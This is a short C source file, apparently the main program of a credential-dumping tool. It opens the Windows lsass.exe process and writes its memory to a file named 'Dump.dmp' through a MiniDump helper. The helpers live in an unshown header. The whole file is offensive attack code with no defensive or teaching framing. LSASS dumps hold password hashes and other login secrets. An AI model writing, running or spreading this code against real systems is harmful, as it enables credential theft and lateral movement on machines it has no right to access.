#include "box.h"

#define TARGET_PROCESS L"lsass.exe"

int main()
{

	HANDLE hProcess = 0;
	DWORD PID = 0;
	LPCSTR FileName = "Dump.dmp";

	if (!GetRemoteProcID(TARGET_PROCESS, &PID, &hProcess))
	{
		PRINT_ERROR("GetRemoteProcID");
		return 1;
	}

	INFO("[%d] [0x%p] Current PID and Process Handle to %ls", PID, hProcess, TARGET_PROCESS);

	if (!DumpViaMiniDump(FileName, hProcess, PID))
	{
		PRINT_ERROR("DumpViaMiniDump");
		return 1;
	}

	INFO("Created New Dump File --> %s", FileName);
	OKAY("Successfully Dumped LSASS!");
	OKAY("DONE!");

	CHAR("Quit...");
	getchar();

	return 0;

}